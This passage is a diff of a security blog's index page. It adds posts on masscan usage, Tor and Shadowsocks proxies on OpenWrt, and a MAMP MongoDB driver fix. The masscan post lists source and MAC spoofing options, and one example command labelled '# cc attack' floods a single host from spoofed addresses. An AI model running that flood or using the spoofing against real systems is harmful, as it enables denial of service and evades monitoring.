&lt;host1[,host2][,host3],...&gt;: Exclude hosts/networks</span><br><span class="line">  --excludefile &lt;exclude_file&gt;: Exclude list from file</span><br><span class="line">  --randomize-hosts: Randomize order of hosts (default)</span><br><span class="line">HOST DISCOVERY:</span><br><span class="line">  -Pn: Treat all hosts as online (default)</span><br><span class="line">  -n: Never do DNS resolution (default)</span><br><span class="line">SCAN TECHNIQUES:</span><br><span class="line">  -sS: TCP SYN (always on, default)</span><br><span class="line">SERVICE/VERSION DETECTION:</span><br><span class="line">  --banners: get the banners of the listening service if available. The</span><br><span class="line">    default timeout for waiting to recieve data is 30 seconds.</span><br><span class="line">PORT SPECIFICATION AND SCAN ORDER:</span><br><span class="line">  -p &lt;port ranges&gt;: Only scan specified ports</span><br><span class="line">    Ex: -p22; -p1-65535; -p 111,137,80,139,8080</span><br><span class="line">TIMING AND PERFORMANCE:</span><br><span class="line">  --max-rate &lt;number&gt;: Send packets no faster than &lt;number&gt; per second</span><br><span class="line">  --connection-timeout &lt;number&gt;: time in seconds a TCP connection will</span><br><span class="line">    timeout while waiting for banner data from a port.</span><br><span class="line">FIREWALL/IDS EVASION AND SPOOFING:</span><br><span class="line">  -S/--source-ip &lt;IP_Address&gt;: Spoof source address</span><br><span class="line">  -e &lt;iface&gt;: Use specified interface</span><br><span class="line">  -g/--source-port &lt;portnum&gt;: Use given port number</span><br><span class="line">  --ttl &lt;val&gt;: Set IP time-to-live field</span><br><span class="line">  --spoof-mac &lt;mac address/prefix/vendor name&gt;: Spoof your MAC address</span><br><span class="line">OUTPUT:</span><br><span class="line">  --output-format &lt;format&gt;: Sets output to binary/list/json/grepable/xml</span><br><span class="line">  --output-file &lt;file&gt;: Write scan results to file. If --output-format is</span><br><span class="line">     not given default is xml</span><br><span class="line">  -oL/-oJ/-oG/-oB/-oX &lt;file&gt;: Output scan in List/JSON/Grepable/Binary/XML format,</span><br><span class="line">     respectively, to the given filename. Shortcut for</span><br><span class="line">     --output-format &lt;format&gt; --output-file &lt;file&gt;</span><br><span class="line">  -v: Increase verbosity level (use -vv or more for greater effect)</span><br><span class="line">  -d: Increase debugging level (use -dd or more for greater effect)</span><br><span class="line">  --open: Only show open (or possibly open) ports</span><br><span class="line">  --packet-trace: Show all packets sent and received</span><br><span class="line">  --iflist: Print host interfaces and routes (for debugging)</span><br><span class="line">  --append-output: Append to rather than clobber specified output files</span><br><span class="line">  --resume &lt;filename&gt;: Resume an aborted scan</span><br><span class="line">MISC:</span><br><span class="line">  --send-eth: Send using raw ethernet frames (default)</span><br><span class="line">  -V: Print version number</span><br><span class="line">  -h: Print this help summary page.</span><br><span class="line">EXAMPLES:</span><br><span class="line">  masscan -v -sS 192.168.0.0/16 10.0.0.0/8 -p 80</span><br><span class="line">  masscan 23.0.0.0/0 -p80 --banners -output-format binary --output-filename internet.scan</span><br><span class="line">  masscan --open --banners --readscan internet.scan -oG internet_scan.grepable</span><br><span class="line">SEE (https://github.com/robertdavidgraham/masscan) FOR MORE HELP</span><br></pre></td></tr></table></figure>
+<p><strong>Other Setting</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">--wait &lt;int&gt;: wait time</span><br><span class="line">-oR &lt;value&gt;: setting redis connect 127.0.0.1:6379</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; masscan 0.0.0.0/4 -p80 --rate 100000000 --router-mac 66-55-44-33-22-11</span><br><span class="line">&gt; masscan 10.1.2.3 -p80 --banners --rate 10000000 --repeat --source-address 192.168.1.0/8 --source-port 0-65535 --output-format null    # cc attack</span><br></pre></td></tr></table></figure>
+<p><strong>Differences in Log Formats</strong></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>time</th>
+<th>ip</th>
+<th>port</th>
+<th>state/status</th>
+<th>ip_proto</th>
+<th>reason</th>
+<th>ttl</th>
+<th>proto/service</th>
+<th>owner</th>
+<th>sunrpc</th>
+<th>version</th>
+<th>banner</th>
+<th>cert</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>binary</td>
+<td>yes</td>
+<td>yes</td>
+<td>yes</td>
+<td>yes</td>
+<td>yes</td>
+<td>yes</td>
+<td>yes</td>
+<td>yes</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>yes</td>
+<td>yes</td>
+</tr>
+<tr>
+<td>xml</td>
+<td>no</td>
+<td>yes</td>
+<td>yes</td>
+<td>yes</td>
+<td>yes</td>
+<td>yes</td>
+<td>yes</td>
+<td>yes</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>yes</td>
+<td>yes</td>
+</tr>
+<tr>
+<td>grepable</td>
+<td>no</td>
+<td>yes</td>
+<td>yes</td>
+<td>yes</td>
+<td>yes</td>
+<td>no</td>
+<td>no</td>
+<td>yes</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>yes</td>
+<td>yes</td>
+</tr>
+<tr>
+<td>json</td>
+<td>no</td>
+<td>yes</td>
+<td>yes</td>
+<td>yes</td>
+<td>yes</td>
+<td>yes</td>
+<td>yes</td>
+<td>yes</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>yes</td>
+<td>yes</td>
+</tr>
+<tr>
+<td>null</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>n/a</td>
+</tr>
+<tr>
+<td>redis</td>
+<td>no</td>
+<td>yes</td>
+<td>yes</td>
+<td>no</td>
+<td>yes</td>
+<td>no</td>
+<td>no</td>
+<td>no</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>no</td>
+<td>no</td>
+</tr>
+<tr>
+<td>text</td>
+<td>yes</td>
+<td>yes</td>
+<td>yes</td>
+<td>yes</td>
+<td>yes</td>
+<td>no</td>
+<td>no</td>
+<td>yes</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>yes</td>
+<td>yes</td>
+</tr>
+<tr>
+<td>unicornscan</td>
+<td>no</td>
+<td>yes</td>
+<td>yes</td>
+<td>yes</td>
+<td>yes</td>
+<td>no</td>
+<td>yes</td>
+<td>no</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>n/a</td>
+<td>no</td>
+<td>no</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Capabilities and samples</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">binary</span><br><span class="line">xml</span><br><span class="line">grepable</span><br><span class="line">json</span><br><span class="line">null</span><br><span class="line">redis</span><br><span class="line">text (a.k.a. &quot;list&quot;)</span><br><span class="line">unicornscan</span><br></pre></td></tr></table></figure></p>
+<p><strong>import to redis</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; sudo masscan -p8899,8088,5566 119.97.243.42 --output-format redis -oR 127.0.0.1:6379</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>redis-cli</p>
+</blockquote>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1:6379&gt; keys *</span><br><span class="line">1) &quot;192.168.1.10:8080/tcp&quot;</span><br><span class="line">2) &quot;192.168.1.10:80/tcp&quot;</span><br><span class="line">3) &quot;host&quot;</span><br><span class="line">4) &quot;192.168.1.10&quot;</span><br><span class="line">5) &quot;192.168.1.10:8181/tcp&quot;</span><br></pre></td></tr></table></figure>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.safebuff.com/2017/02/26/Openwrt-install-Tor-Proxy/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xl7dev">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xl7dev">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/02/26/Openwrt-install-Tor-Proxy/" itemprop="url">Openwrt install Tor Proxy</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-26T18:41:12+08:00">
+                2017-02-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; opkg update</span><br><span class="line">&gt; opkg install tor</span><br></pre></td></tr></table></figure>
+<p>root@OpenWrt:~# vi /etc/tor/torrc<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">RunAsDaemon 0  </span><br><span class="line">DataDirectory /var/lib/tor  </span><br><span class="line">User tor  </span><br><span class="line">Socks5Proxy 127.0.0.1:1080</span><br><span class="line">SocksPort 0.0.0.0:9050  </span><br><span class="line">TransPort 0.0.0.0:9040  </span><br><span class="line">DNSPort 0.0.0.0:53  </span><br><span class="line">AvoidDiskWrites 1</span><br></pre></td></tr></table></figure></p>
+<p>root@OpenWrt:~# vi /etc/config/dhcp<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">config dnsmasq</span><br><span class="line">       option noresolv &apos;1&apos;</span><br><span class="line">       list server &apos;127.0.0.1#53&apos;</span><br></pre></td></tr></table></figure></p>
+<p>root@OpenWrt:~# /etc/init.d/tor stop<br>root@OpenWrt:~# tor</p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.safebuff.com/2017/02/26/Openwrt-install-Shadowsocks-auto-Proxy/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xl7dev">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xl7dev">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/02/26/Openwrt-install-Shadowsocks-auto-Proxy/" itemprop="url">Openwrt install Shadowsocks auto Proxy</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-26T12:37:56+08:00">
+                2017-02-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; opkg update</span><br><span class="line">&gt; opkg install ip ip-full iptables-mod-tproxy ipset libopenssl iptables-mod-tproxy</span><br><span class="line">&gt; wget https://github.com/aa65535/openwrt-chinadns/releases/download/v1.3.2-4/ChinaDNS_1.3.2-4_ar71xx.ipk</span><br><span class="line">&gt; wget https://github.com/aa65535/openwrt-dist-luci/releases/download/v1.6.0/luci-app-chinadns_1.6.0-1_all.ipk</span><br><span class="line">&gt; opkg install *.ipk</span><br></pre></td></tr></table></figure>
+<h4 id="ChinaDNS"><a href="#ChinaDNS" class="headerlink" title="ChinaDNS"></a>ChinaDNS</h4><p>Services &gt;&gt; ChinaDNS</p>
+<table>
+<thead>
+<tr>
+<th>header 1</th>
+<th>header 2</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Enable</td>
+<td>☑️</td>
+</tr>
+<tr>
+<td>Enable Bidirectional Filter</td>
+<td>☑️ help Also filter results inside China from foreign DNS servers</td>
+</tr>
+<tr>
+<td>Local Port</td>
+<td>5353</td>
+</tr>
+<tr>
+<td>CHNRoute File</td>
+<td>/etc/chinadns_chnroute.txt</td>
+</tr>
+<tr>
+<td>Upstream Servers</td>
+<td>180.76.76.76,8.8.4.4</td>
+</tr>
+</tbody>
+</table>
+<p>root@OpenWrt:~# crontab -e</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0 0 * * * wget -O- &apos;http://ftp.apnic.net/apnic/stats/apnic/delegated-apnic-latest&apos; | awk -F\| &apos;/CN\|ipv4/ &#123; printf(&quot;%s/%d\n&quot;, $4, 32-log($5)/log(2)) &#125;&apos; &gt; /etc/chinadns_chnroute.txt</span><br></pre></td></tr></table></figure>
+<h4 id="Shadowsocks"><a href="#Shadowsocks" class="headerlink" title="Shadowsocks"></a>Shadowsocks</h4><p><strong>Services &gt;&gt; ShadowSocks &gt;&gt; General Settings &gt;&gt; Transparent Proxy</strong></p>
+<table>
+<thead>
+<tr>
+<th>header 1</th>
+<th>header 2</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Main Server</td>
+<td>[Shadowsocks server IP:Port]</td>
+</tr>
+<tr>
+<td>UDP-Relay Server</td>
+<td>Same as Main Server</td>
+</tr>
+<tr>
+<td>Local Port</td>
+<td>1234</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Services &gt;&gt; ShadowSocks &gt;&gt; SOCKS5 Proxy</strong></p>
+<table>
+<thead>
+<tr>
+<th>header 1</th>
+<th>header 2</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Server</td>
+<td>[Shadowsocks Server IP:Server Port]</td>
+</tr>
+<tr>
+<td>Local Port</td>
+<td>1080</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Services &gt;&gt; ShadowSocks &gt;&gt; Servers Manage &gt;&gt; Edit</strong></p>
+<table>
+<thead>
+<tr>
+<th>header 1</th>
+<th>header 2</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Server</td>
+<td>[Shadowsocks IP]</td>
+</tr>
+<tr>
+<td>Server Port</td>
+<td>[Shadowsocks Port]</td>
+</tr>
+<tr>
+<td>Connection Timeout</td>
+<td>60</td>
+</tr>
+<tr>
+<td>Password</td>
+<td>password</td>
+</tr>
+<tr>
+<td>Encrypt Method</td>
+<td>AES-256-CFB</td>
+</tr>
+<tr>
+<td>Plugin Name</td>
+<td></td>
+</tr>
+<tr>
+<td>Plugin Arguments</td>
+<td></td>
+</tr>
+</tbody>
+</table>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://blog.safebuff.com/2017/02/25/Mac-OSX-install-MAMP-mongo-php-driver/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="xl7dev">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="https://avatars2.githubusercontent.com/u/9393930?v=3&s=460">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xl7dev">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2017/02/25/Mac-OSX-install-MAMP-mongo-php-driver/" itemprop="url">Mac OSX install MAMP mongo-php-driver</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2017-02-25T22:15:23+08:00">
+                2017-02-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; brew install openssl autoconf</span><br><span class="line">&gt; echo &apos;export PATH=&quot;/usr/local/opt/openssl/bin:$PATH&quot;&apos; &gt;&gt; ~/.zshrc</span><br><span class="line">&gt; sudo /Applications/MAMP/bin/php/php5.6.10/bin/pecl install mongodb</span><br></pre></td></tr></table></figure>
+<p>open MAMP Pro &gt; File &gt; Edit Template &gt; PHP &gt; php5.6.10.ini<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">MAMP_apc_MAMP</span><br><span class="line">extension=imap.so</span><br><span class="line">extension=gettext.so</span><br><span class="line">extension=mcrypt.so</span><br><span class="line">extension=yaz.so</span><br><span class="line">extension=pgsql.so</span><br><span class="line">extension=pdo_pgsql.so</span><br><span class="line">extension=mongodb.so</span><br></pre></td></tr></table></figure></p>
+<p>open <a href="http://127.0.0.1/phpinfo.php" target="_blank" rel="noopener">http://127.0.0.1/phpinfo.php</a> grep mongodb</p>
+<p><strong>Q1</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">running: phpize</span><br><span class="line">grep: /Applications/MAMP/bin/php/php5.6.10/include/php/main/php.h: No such file or directory</span><br><span class="line">grep: /Applications/MAMP/bin/php/php5.6.10/include/php/Zend/zend_modules.h: No such file or directory</span><br><span class="line">grep: /Applications/MAMP/bin/php/php5.6.10/include/php/Zend/zend_extensions.h: No such file or directory</span><br></pre></td></tr></table></figure></p>
+<p><strong>fix</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo ln -s /Applications/Xcode.app/Contents/Developer/Platforms/MacOSX.platform/Developer/SDKs/MacOSX.sdk/usr/include/ /Applications/MAMP/bin/php/php5.6.10/include</span><br></pre></td></tr></table></figure></p>
+<p><strong>Q2</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">private/tmp/pear/install/mongodb/src/libbson/src/bson/ -DHAVE_CONFIG_H -g -O2 -D_THREAD_SAFE -pthread -c /private/tmp/pear/install/mongodb/src/libmongoc/src/mongoc/mongoc-crypto-openssl.c  -fno-common -DPIC -o src/libmongoc/src/mongoc/.libs/mongoc-crypto-openssl.o</span><br><span class="line">/private/tmp/pear/install/mongodb/src/libmongoc/src/mongoc/mongoc-crypto-openssl.c:24:10: fatal error: &apos;openssl/sha.h&apos; file not found</span><br><span class="line">#include &lt;openssl/sha.h&gt;</span><br><span class="line">         ^</span><br><span class="line">1 error generated.</span><br></pre></td></tr></table></figure></p>
+<p><strong>fix</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; cd /usr/local/include </span><br><span class="line">&gt; ln -s ../opt/openssl/include/openssl .</span><br></pre></td></tr></table></figure></p>
 
           
         
@@ -352,6 +1800,10 @@
   </section>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
 
 
           </div>
@@ -399,7 +1851,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-count">86</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -407,6 +1859,15 @@
 
             
 
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">66</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
             
 
           </nav>
